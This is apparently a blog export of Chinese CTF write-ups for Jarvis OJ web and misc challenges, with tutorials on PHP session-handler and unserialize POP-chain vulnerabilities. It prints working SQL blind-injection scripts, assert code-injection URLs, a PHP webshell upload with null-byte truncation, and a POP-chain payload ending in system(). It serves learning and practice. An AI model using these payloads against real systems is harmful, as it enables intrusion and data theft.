adabinwalk查看带有一个zip，foremost分离得到加密的zip/ 然后用图片的详细信息里面的16进制转为ascii即是密码。千万记住加0x！！！比赛卡了很长时间，我说的为什么不对！！！ 神秘的文件一看样子就是明文攻击。唉…..说多了都是泪。没网，以前的工具也找不到了….干瞪眼吧！回学校一看，就算找到工具也不行！因为压缩那一步必须是WinRar软件(压缩算法和CRC一样即可)，而我用的是Bandzip… 用ARPR进行明文攻击。保存解出的zip。 然后把docx后缀改成zip找到falg.txt base64解密即可得flag。 basic做过类似的题目，还存这脚本。135000不能开放也不是素数。就是不知道x，y… 进制转换比赛手撕…回来看看别人怎么写的python脚本，以后多练python….. 12345678910111213141516import binascii​text = "d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e"solution = ''text2 = text.split(' ')for x in text2: print x if x\[0\] == 'b': #binary solution += chr(int(x\[1:\],2)) elif x\[0\] == 'x': # hexadecimal solution += x\[1:\].decode("hex") elif x\[0\] == 'd': # decimal solution += chr(int(x\[1:\])) elif x\[0\] == 'o': # octal solution += chr(int(x\[1:\],8))print solution colors用StegSolve打开每一张图片查看最低位通道发现hint： 修改图片高度得到： 联想二进制，黑-&gt;1,白-&gt;0。刚好七张图片，我们联想ascii码的可打印字符是7位二进制。所以必须竖读。写(贴)个python脚本得flag： 12345678910111213141516171819202122232425262728293031coding:utf-8def encode(s): return ' '.join(\[bin(ord(c)).replace('0b', '') for c in s\])def decode(s): return ''.join(\[chr(i) for i in \[int(b, 2) for b in s.split(' ')\]\])​l = \[''\] * 7​f = open('code.txt', 'r') # 01矩阵for i in range(7): j = 0 line = f.readline().replace('\\n','') l\[i\] = line\# print l​\## 矩阵初始化ll=\[''\] * 20for i in range(len(ll)): ll\[i\]=\[''\] * 7\## 矩阵翻转for i in range(20): for j in range(7): ll\[i\]\[j\] = l\[j\]\[i\]\# print ll​flag = ''for i in ll: t = ''.join(i) flag += decode(t)print flag Forenisc日志分析打开发现一堆sql注入的信息 我们先url decode，这里我用的burpsuite挺方便的。这样手撕起来就比较好看了。 发现是sql盲注二分查找，根据返回404还是200直接判断就好了。25个字符还好，手撕比脚本快一点吧。 附(贴)python判断脚本 123456789101112131415161718192021222324# coding:utf-8import reimport urllib​f = open('access.log','r')lines = f.readlines()datas = \[\]for line in lines: t = urllib.unquote(line) if '1765' in t and 'flag' in t: # 过滤出与flag相关，正确的猜解 datas.append(t)​flag_ascii = &#123;&#125; for data in datas: matchObj = re.search( r'LIMIT 0,1\\),(.*?),1\\)\\)&gt;(.*?) AND', data) if matchObj: key = int(matchObj.group(1)) value = int(matchObj.group(2))+1 flag_ascii\[key\] = value # 使用字典，保存最后一次猜解正确的ascii码flag = ''for value in flag_ascii.values(): flag += chr(value)print flag 特殊后门提示特殊协议，过滤搜索flag找到了ICMP协议。 之后把后面的一个个手撕拼接OK。 weblogic搜索hostname定位过滤，追踪HTTP流再搜索hostname。hint：16进制]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jarvisoj-web-WP]]></title>
    <url>%2F2018%2F10%2F18%2Fjarvisoj-webwp-3%2F</url>
    <content type="text"><![CDATA[WEB?这个题目一看一脸懵逼。注入扫目录都没结果。查看源码发现有俩连接很诡异。既然题目提示web？可能就在此下手了。 打开后一看是这么一堆：先找个js代码格式工具格式一下。既然是js代码就根据前端有什么就搜什么吧。 搜索Wrong Password。发现一个checkpass函数。搜索chekpass发现这么一堆： 我也不是很懂。。。谷歌后发现是一个25元方程组，利用python里面pumpy模块可以直接求解。猜测应该解出来就是password了。 得到flag。果然不是web题目。。。。 关于这个numpy模块查了一下貌似很强大，可以解很多矩阵。很多密码题目可能用到。 PHPINFO 其实一上来我以为很简单。一看这就是反序列化。之前总结过然而貌似是另外一种反序列化类型：Session序列化及反序列化处理器的安全问题。下篇文章总结一下。 根据源码理解，直接get传入phpinfo会直接能看到php设置。可能存在很多有用的信息。 然后就貌似不会了。。谷歌后发现这是：Session序列化及反序列化处理器的安全问题。其实重点在于这段代码： ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); 其意思是设置php序列化及反序列化时使用的处理器为php。 关于php处理器： PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化： 而php.ini中默认session.serialize_handler为php_serialize。这就会带来安全问题。 简单来说就是： $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize 读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 发现可以利用反序列化带入可执行数据到session中。 构造序列化值，本地搭建环境构造表单上传文件,再查询文件目录。代码如下： 在本地搭建环境访问构造的页面抓包上传我们的序列化payload。 注意要在前面加| 并且要用转译”符号。 得到了一个文件： 然后仿照上面操作访问这个文件。 得到flag。具体关于反序列化第二种情况上篇文章详细说明了。 Easy Gallery发现有个上传页面，直接上传小马。这个马经过验证需要绕过马（这个php7.0后就不可以用了）： @eval\_r($\_POST\[sb\]) 通过在view里面输入图片ID和图片类型发现图片链接为： http://web.jarvisoj.com:32785/uploads/show.php?id=xxx&amp;type=jpg 查看源码得到绝对地址 http://web.jarvisoj.com:32785/uploads/图片ID.jpg 得到图片地址：uploads/1539874317.jpg通过url访问： http://web.jarvisoj.com:32785/index.php?page=uploads/1539874317.jpg 回显错误： 查看他给自动加上了.php。直接%00截断访问： http://web.jarvisoj.com:32785/index.php?page=uploads/1539874317.jpg%00 得到flag： 一般来讲ctf不用菜刀连接直接post命令ls可以获得flag。当然连接也可以。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Session序列化及反序列化处理器的安全问题]]></title>
    <url>%2F2018%2F10%2F18%2FSession%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[一、漏洞原理PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化。处理器对应的存储格式: php 1键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 php_binary 1键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 php_serialize(php&gt;=5.5.4) 1经过 serialize() 函数反序列处理的数组 php.ini中默认session.serialize_handler为php_serialize。 而PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器： 1session.serialize\_handler "php" PHP\_INI_ALL 通过上面对存储格式的分析，如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据： 1$_SESSION\['ryat'\] = '|O:8:"stdClass":0:&#123;&#125;'; 例如上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下： 1a:1:&#123;s:4:"ryat";s:20:"|O:8:"stdClass":0:&#123;&#125;";&#125; 在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，那么反序列化后的数据将会变成： 1// var\_dump($\_SESSION); array(1) &#123; \["a:1:&#123;s:4:"ryat";s:20:""\]=&gt; object(stdClass)#1 (0) &#123; &#125; &#125; 可以看到，通过注入 | 字符伪造了对象的序列化数据，成功实例化了 stdClass 对象：） 二、实际利用i）当 session.auto_start＝On 时：当配置选项 session.auto_start＝On，会自动注册 Session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话，然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题，如下面的代码： 1//foo.php if (ini\_get('session.auto\_start')) &#123; session\_destroy(); &#125; ini\_set('session.serialize\_handler', 'php\_serialize'); session\_start(); $\_SESSION\['ryat'\] = $_GET\['ryat'\]; 当第一次访问该脚本，并提交数据如下： 1foo.php?ryat=|O:8:"stdClass":0:&#123;&#125; 脚本会按照 php_serialize 处理器的序列化格式存储数据： 1a:1:&#123;s:4:"ryat";s:20:"|O:8:"stdClass":0:&#123;&#125;";&#125; 当第二次访问该脚本时，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：） 这里需要注意的是，因为 PHP 自动注册 Session 会话是在脚本执行前，所以通过该方式只能注入 PHP 的内置类。 ii）当 session.auto_start＝Off 时：当配置选项 session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码： 1//foo1.php ini\_set('session.serialize\_handler', 'php\_serialize'); session\_start(); $\_SESSION\['ryat'\] = $\_GET\['ryat'\]; //foo2.php ini\_set('session.serialize\_handler', 'php'); //or session.serialize\_handler set to php in php.ini session\_start(); class ryat &#123; var $hi; function \_\_wakeup() &#123; echo 'hi'; &#125; function \_\_destruct() &#123; echo $this-&gt;hi; &#125; &#125; 当访问 foo1.php 时，提交数据如下： 1foo1.php?ryat=|O:4:"ryat":1:&#123;s:2:"hi";s:4:"ryat";&#125; 脚本会按照 php_serialize 处理器的序列化格式存储数据，访问 foo2.php 时，则会按照 php 处理器的反序列化格式读取数据，这时将会反序列化伪造的数据，成功实例化了 ryat 对象，并将会执行类中的 __wakeup 方法和 __destruct 方法：） 三、更深理解漏洞关键在于： 1.脚本中设置的序列化处理器与php.ini设置的不同 2.两个脚本注册session使用的序列化处理器不同 （存储时序列化的和读取时反序列化的）处理器不同就会产生安全问问题。 原因：未正确处理\\’|\\’。 比如：以php_serilize方式存入的时候，构造出”|” 伪造的序列化值存入。但之后解析又是用的php处理器的话，那么将会反序列化伪造的数据（\\’|\\’之前当作键名，\\’|\\’之后当作键值） （L.N.: php5.6.13版本以前是第一个变量解析错误注销第一个变量，然后解析第二个变量，但是5.6.13以后如果第一个变量错误，直接销毁整个session）。 通过什么方式将数据注入到session中呢？ 1.开发者本身将用户可控的数据传进了session（比如joomla等） 2.通过配置不当可造成session被控。 当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$_SESSION中。 构造表单： POST一个名为PHP_SESSION_UPLOAD_PROGRESS的值，便可以将上传的文件名写入session。 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;test XXE&lt;/title&gt;&lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt;&lt;!--不对字符编码--&gt;&lt;input type="hidden" name="PHP\_SESSION\_UPLOAD_PROGRESS" value="123" /&gt;&lt;input type="file" name="file" /&gt;&lt;input type="submit" value="go" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 后面的难点在于构造出pop链达到自己想要的结果。 参考：wooyun：ryat一篇文章]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jarvis OJ Web WriteUp(2)]]></title>
    <url>%2F2018%2F09%2F27%2FJarvis%20OJ%20Web%20WriteUp(2)%2F</url>
    <content type="text"><![CDATA[babyphp描述里面发现使用了Git，直接御剑爆破出.git目录。利用工具扒下源码，审计一波。 源码：123456789101112&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = "home";&#125;$file = "templates/" . $page . ".php";// I heard '..' is dangerous!assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");// TODO: Make this look niceassert("file_exists('$file')") or die("That file doesn't exist!");?&gt; assert函数果断是常见的危险函数。如果第一个参数是字符串会当作为代码执行。构造payload： ` 1http://web.jarvisoj.com:32798/?page=flag'.system("ls templates/;").' http://web.jarvisoj.com:32798/?page=flag'.system("cat templates/flag.php;").' 也可以利用注释掉后面的语句构造payload。 simple injection上来一脸懵逼，post注入直接上sqlmap，发现有waf。然后sqlmap绕过waf还不会。。。只能手动了。。。 常规测试: 1.先常规测试一下： username=admin&#39;# 密码随便填，发现报错密码错误。验证了没有过滤’#，而且存在报错注入。 2.然后尝试: admin&#39; order by 1# 发现说用户不存在，那么就说明有waf过滤了空格或order或by中至少一个。 3.先猜测空格吧： 把空格换成//，提示密码错误。ok绕过过滤空格。 4.测试一下万能密码： admin&#39;/**/or/**/1=1#提示密码错误，没有过滤or。但是存在密码验证，万能密码不能用。 常见的登陆漏洞类型： ①同时验证用户名和密码： 1234567$sql = select * from users where username=$usernmae and password=$password$result = mysql_query($sql);if($result) &#123; echo "登陆成功";&#125; else &#123;echo "登陆失败";&#125; ②分布验证用户名和密码： 123456789101112131415161718$sql = "select password from users where username='$username'"$result = mysql_query($sql);if($result) &#123;$row = mysql_fetch_row($result);$query_password = $row[$password];# 对输入的$password进行变形$input_password = modify($passowrd);if($input_password == $query_password) &#123; echo "登陆成功";&#125; else &#123; echo "密码错误";&#125;&#125; else &#123;echo "用户不存在";&#125; 分别尝试使用： username=admin&amp;password=123456#密码错误 username=user&amp;password=123456#用户名错误即此题为分步验证。 5.开始盲注 5.1查找表： username=user&#39;/**/or/**/exists(select/**/*/**/from/**/admin)#&amp;password=123456返回密码错误，那么说明在数据库中存在admin表。 5.2查找字段： username=user&#39;/**/or/**/exists(select/**/username,password/**/from/**/admin)#&amp;password=123456 返回密码错误，说明admin中存在username和password字段 username=user&#39;/**/or/**/exists(select/**/count(*)/**/from/**/admin)#&amp;password=123456 返回密码错误，说明在admin表中仅仅只存在一条记录。 得到pasaword长度： username=user&#39;/**/or/**/(select/**/length(password)/**/from/**/admin)&gt;10#&amp;password=123456，通过二分法最终发现password长度为32.即采用md5来加密的。 py脚本跑一下： 123456789101112131415161718192021222324252627282930# -*- coding: utf-8 -*-import requestsdef main(): result="" url="http://web.jarvisoj.com:32787/login.php"data=&#123; 'username':'xx', 'password':'123456'&#125;payload="'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),&#123;0&#125;,1))&gt;&#123;1&#125;#"chars="0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"for i in range(1,33): for j in chars: char_ascii=ord(j) sql_payload=payload.format(i,char_ascii) data['username']=sql_payload #因为注入点在username上 rep=requests.post(url=url,data=data) length=len(rep.text) if length&gt;1191: result+=j print result breakprint resultprint "Done"if __name__=="__main__":main() 得出MD5破解后登陆得flag。 在网上还流产一种解法比较骚： 常规测试后猜测： 通过用户名查询密码，然后如果查不出行就提示用户名错误，如果查出了且密码匹配不对，就提示密码错误。 然后直接用联合查询把后面带入user查询password得语句注释掉而是使用查询1： username=admin123&#39;UNION(SELECT(1))#&amp;password=123 返回密码错误，说明语句执行成功。 然后尝试把密码改为1提交不正确，猜测后端使用了MD5加密进行比较。因此构造语句： username=admin123&#39;UNION(SELECT(md5(123)))#&amp;password=123 得flag。 太骚啦~！！ 通过控制查询到得MD5值，再输入一个匹配得密码使其登陆成功。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反序列化漏洞的成因及利用]]></title>
    <url>%2F2018%2F09%2F27%2F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0%E5%8F%8A%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[接着上篇继续讲：反序列化漏洞0x01.本质无害 反序列化的数据本质上来说是没有危害的 用户可控数据进行反序列化是存在危害的 0x02.漏洞根源 根本原因:程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。 这个漏洞的形成是由于跟serialize和unserialize相关的magic函数违背正确利用的缘故。 在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。 0x03.POP链及漏洞发现技巧由于反序列化漏洞需要很多类甚至需要跨越不同的文件，所有一般只可能白盒审计才可能发现反序列化漏洞。黑盒一般发现不了，因为根本不知道内部具体的代码函数情况，不过可以想办法把源码弄到手。 默认情况下 Composer 会从 Packagist下载包,那么我们可以通过审计这些包来找到可利用的 POP链。 找PHP链的基本思路: 1.在各大流行的包中搜索 __wakeup() 和 __destruct() 函数 2.追踪调用过程(反向找，正向验证) 3.手工构造 并验证 POP 链 4.开发一个应用使用该库和自动加载机制,来测试exploit 一些对我们来说有用的POP链方法： 命令执行： 1234exec()passthru()popen()system() 文件操作： 123file_put_contents()file_get_contents()unlink() 0x03.构造exploit的思路碰到php反序列化的问题时，如果参数可控，我们要反方向去寻找，即先找到调用我们想要调用的函数或方法，然后给可控的参数赋恰当的值，逆向推理，最后得出序列化字符串。 1.寻找可能存在漏洞的应用 2.在他所使用的库中寻找 POP gadgets 3.在虚拟机中安装这些库,将找到的POP链对象序列化,在反序列化测试payload 4.将序列化之后的payload发送到有漏洞web应用中进行测试 这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果 0x04.利用反序列化漏洞利用两个条件： 1、程序中存在序列化字符串的输入点 2、程序中存在可以利用的magic函数举个例子： 源码： &lt;?php error_reporting(0); highlight_file(__FILE__); class gg { private $gg; public function __destruct() { $this-&gt;gg-&gt;get1(); } } class start { private $start1; private $start2; public function get1() { $s1 = $this-&gt;start1; $s2 = $this-&gt;start2; $s1($s2); } } class cat { private $name = &quot;蛋黄&quot;; private $color = &quot;橘色&quot;; private $weight = &quot;5公斤&quot;; public function getName() { return $this-&gt;name; } public function getColor() { return $this-&gt;color; } public function getWeight() { return $this-&gt;weight; } public function __invoke($args) { echo $args.&quot;不是函数&quot;; } } class test2 { private $a; public function __toString() { $this-&gt;a-&gt;getFlag(); } } class flag { public function getFlag() { system(&apos;cat ../flag.txt&apos;); } } $x = $_GET[&apos;x&apos;]; if (isset($x)) { unserialize($x); } ?&gt;思路： 看到 unserialize（）知道是反序列化问题 从后往前逆推 1)想要得到flag 必须得调用flag 类里面的 getflag()方法 2)往上看，发现test2 里面调用了getflag()方法 3)但是这个getflag是a对应的方法，所以必须把a赋值为flag的类并且，getflag()函数在tostring 里面，所以要把test2类当作一个字符串来使用 4)上面cat 方法里面有关于字符串的调用，所以可以把args 赋为text2 的新类，但是想要调用echo 语句，必须得调用 invoke方法，所以呢，要把cat 当作一个函数来使用 5） 向上寻找函数的调用，发现start 里面有关于函数的调用，所以应该把s1赋值为cat的类，而s2 是函数的参数，联想到上面的__revoke，所以，可以把$s2赋值为test2的类 6)想要实现上述，必须调用get1()方法，向上寻找，发现gg类中调用了get1()，但是却是变量gg的 方法，所以将变量gg赋值为start的类，就可以调用get1()方法了 payload： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?phpclass gg&#123; private $gg; public function __construct() &#123; $this-&gt;gg = new start(); &#125; public function __destruct() &#123; $this-&gt;gg-&gt;get1(); &#125;&#125;class start&#123; private $start1; private $start2; public function __construct() &#123; $this-&gt;start1 = new cat(); $this-&gt;start2=new test2(); &#125; public function get1() &#123; $s1 = $this-&gt;start1; $s2 = $this-&gt;start2; $s1($s2); &#125;&#125;class cat&#123; private $name = "蛋黄"; private $color = "橘色"; private $weight = "5公斤"; public function getName() &#123; return $this-&gt;name; &#125; public function getColor() &#123; return $this-&gt;color; &#125; public function getWeight() &#123; return $this-&gt;weight; &#125; public function __invoke($args) &#123; echo $args."不是函数"; &#125;&#125;class test2&#123; private $a; public function __construct() &#123; $this-&gt;a = new flag(); &#125; public function __toString() &#123; $this-&gt;a-&gt;getFlag(); &#125;&#125;class flag&#123; public function getFlag() &#123; system('cat ../flag.txt'); &#125;&#125;$b = new gg;echo urlencode(serialize($b))."&lt;br / &gt;";?&gt; 正向理思路： 1.首先选创建一个新类gg，销毁时调用方__destruct，调用get1() 2.get1()中，s1 是cat的新类，s2是test2的新类，s1当作函数，调用__invoke,s2 当作字符串，调用__tostring 3.然后调用__tostring,中的getflag(),执行system(),获得flag]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[序列化、反序列化的理解]]></title>
    <url>%2F2018%2F09%2F27%2F%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[之前看过反序列化的漏洞，不算是很系统。昨天和小伙伴正好遇到了一道反序列化的题目，借此总结一下。分俩个部分： 1.序列化、反序列化的理解 2.反序列化漏洞的成因及利用 1.序列化、反序列化的理解0x01什么是序列化？ 序列化： 将数据结构或对象转换成字节序列、二进制串的过程。 反序列化：将在序列化过程中所生成的二进制串转换成数据结构或者对象的过程。 注： 字节序是指多字节数据在计算机内存中存储或者网络传输时各字节的存储顺序。 0x02用处序列化是让对象脱离运行环境的一种手段,可以有效的实现多平台之间的通信、对象持久化存储。 序列化成字节序列后，便于保存在内存、文件、数据库中，也可以理解为：序列化是指将一个对象转换成一个字符串，如： 1O:7:"Logfile":1: &#123;s:8:"filename";s:10:"source.txt" ;&#125; 0x03函数Java：ObjectOutputStream类的writeObject()、 readObject() PHP：serialize()、Unserialize()0x04php序列字符串的模型意义a - array 数组 b - boolean布尔型 d - double双精度型 i - integer o - common object一般对象 r - reference s - string C - custom object 自定义对象 O - class N - null R - pointer reference U - unicode string unicode编码的字符串0x05使用场景1) 一般来说，服务器启动后，就不会再关闭了，但是如果逼不得已需要重启，而用户会话还在进行相应的操作，这时就需要使用序列化将session信息保存起来放在硬盘，服务器重启后，又重新加载。这样就保证了用户信息不会丢失，实现永久化保存。 2) 在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便减轻内存压力或便于长期保存。 比如： 最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。 以下都可能需要使用序列化： • http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等 • Servlets HTTP，Sockets，Session管理器 包含的协议就包括JMX，RMI，JMS，JNDI等（\xac\xed） • xml Xstream,XMLDecoder等（HTTP Body：Content-Type:application/xml） • json(Jackson，fastjson) http请求中0x06PHP中的magic函数magic函数以_开头。在特定的条件下会自动执行这些magic函数的内容，比如创建、销毁对象的时候。 1construct(), destruct() 构造函数与析构函数，创建类销毁类时自动调用。 1call(), callStatic() 方法重载的两个函数 __call()是在对象上下文中调用不可访问的方法时触发 __callStatic()是在静态上下文中调用不可访问的方法时触发。 1get(), set() __get()用于从不可访问的属性读取数据。 __set()用于将数据写入不可访问的属性。 1isset(), unset() __isset()在不可访问的属性上调用isset()或empty()触发。 __unset()在不可访问的属性上使用unset()时触发。 1sleep(), wakeup() serialize()检查您的类是否具有魔术名sleep()的函数。如果是这样，该函数在任何序列化之前执行。它可以清理对象，并且应该返回一个数组，其中应该被序列化的对象的所有变量的名称。如果该方法不返回任何内容，则将NULL序列化并发出E_NOTICE。sleep()的预期用途是提交挂起的数据或执行类似的清理任务。此外，如果有非常大的对象，不需要完全保存，该功能将非常有用。 unserialize()使用魔术名wakeup()检查函数的存在。如果存在，该功能可以重构对象可能具有的任何资源。wakeup()的预期用途是重新建立在序列化期间可能已丢失的任何数据库连接，并执行其他重新初始化任务。 1__toString() __toString（）方法允许一个类决定如何处理像一个字符串时它将如何反应。 1__invoke() 当脚本尝试将对象调用为函数时，调用__invoke()方法。 123__set_state()__clone()__debugInfo()]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jarvis OJ Web WriteUp(1)]]></title>
    <url>%2F2018%2F09%2F26%2FJarvis%20OJ%20Web%20WriteUp(1)%2F</url>
    <content type="text"><![CDATA[PORT51一上来看有点懵逼，以为是Burp抓包。最后google后发现应该在vps上（不用vps的话经过路由器可能端口就变了）用以下命令就可以。1curl --ocal-port http://xxx.com之前没有接触过curl，只是在docker里面用过一次。1curl就是：在linux中一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。 由于安装linux的时候很多时候是没有安装桌面的，也意味着没有浏览器，因此这个方法也经常用于测试一台服务器是否可以到达一个网站。 当然也可以进行ip伪造等等测试操作。 LOCALHOSTburp抓包添加头 1X-Forwarded-For: 127.0.0.1 Login抓包后发现Hint： 1"select * from 'admin' where password='".md5($pass,true)."'" 首先想到MD5注入。 具体原理： 提价传入的password如果是特殊字符串，那么该字符串转化为MD5再经过PHP转化为字符串后变成： &#39;or&#39;6蒥欓!r,b 那么最后的sql语句则变成： select * fromadminwhere password=&#39;&#39;or&#39;6蒥欓!r,b&#39; 即成功闭合了’ bypass成功。 神盾局的秘密发现url里面有base64编码。猜测是利用base64访问任意文件。 分别读取index.php，shield.php。审计源码发现存在反序列化漏洞。 通过脚本： 1234567&lt;?php class Shield &#123; public $file = "pctf.php"; &#125; $chybeta = new Shield(); print_r(serialize($chybeta));?&gt; 生成序列化串： 1O:6:"Shield":1:&#123;s:4:"file";s:8:"pctf.php";&#125;` 访问： 1http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125; 查看源码得flag IN A Mess右键源码发现注释Hint： index.phps 访问后,发现源码： 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123;header('Location: index.php?id=1');exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi ("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder! harder!";&#125;?&gt; 题目意思是:GET传三个字符参数，然后每个参数满足以下条件： ①：id是字符，还需要值为0.所以利用php弱类型0a即可让字符0a转化成数字0 ②：a是一个文件（file_get_contents()函数提取a的内容赋值给data），那么可以是自己vps创建一个文件，也可以利用伪协议php://input。 ③：b满足长度大于5，eregi（）里面满足第一个字符为4，substr（）里面又需要满足b首字母！=4.那么我们可以利用%00截断:b=%0011111即可绕过substr和eregi()，eregi（“111”，“1114”）满足。同时%00对strlen不会发生截断。 饶过后发现/^HT2mCpcvOLf访问自动补全： ` 1http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1 猜测是注入漏洞，上sqlmap发现有waf。过滤了空格关键字，空格可以内敛注释绕过，关键字发现只过滤了一次直接双写绕过。然后常规注入得flag。 RE？一看题目和.so的文件有点害怕，完全没思路。 google后才知道mysql可以导入进去。 导入到plugin文件中，利用该文件创建函数help_me（提示）: create function help_me returns string soname &#39;udf.so&#39; 然后select heilp_me;提示：use getflag function to obtain your flag! 模仿前面创建一个getflag函数调用的flag。 flag在管理员手里首先想到前端认证抓个包发现cookie里面有个guest，改成admin无果。别的地方貌似没有突破口。那就扫一下敏感目录吧。御剑，AWVS无果。 发现一个新的py脚本动态多线程工具：weakfilescan 附链接: ` 1https://github.com/ring04h/weakfilescan 命令： 1python wyspider.py http://web.jarvisoj.com:32778 发现有个index.php~，下载notepad++打开发现乱码，挠头。。。 经过尝试发现linux有个查看文件的命令： #file xxx 然后尝试一下发现是： vim swap file 对于swap是交换的意思，google后发现是vim在编辑的时候强制退出而生成的文件，可以用命令： vim -r index.php.swp 来恢复，恢复后发现源码： 123456789101112131415161718192021222324&lt;?php $auth = false; $role = "guest"; $salt = if (isset($_COOKIE["role"])) &#123; $role = unserialize($_COOKIE["role"]); $hsh = $_COOKIE["hsh"]; if ($role==="admin" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE["role"]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125; &#125; else &#123; $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); &#125; if ($auth) &#123; echo "&lt;h3&gt;Welcome Admin. Your flag is &#125; else &#123; echo "&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"; &#125;?&gt; 发现最关键的是要绕过： 1$role==="admin" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE["role"] 利用hash扩展攻击即可，hash拓展攻击下篇详细总结一下。可以利用hashpump直接爆破出role和hsh。不过需要注意题目反转反序列化传入顺序。 最后payload： 12role = 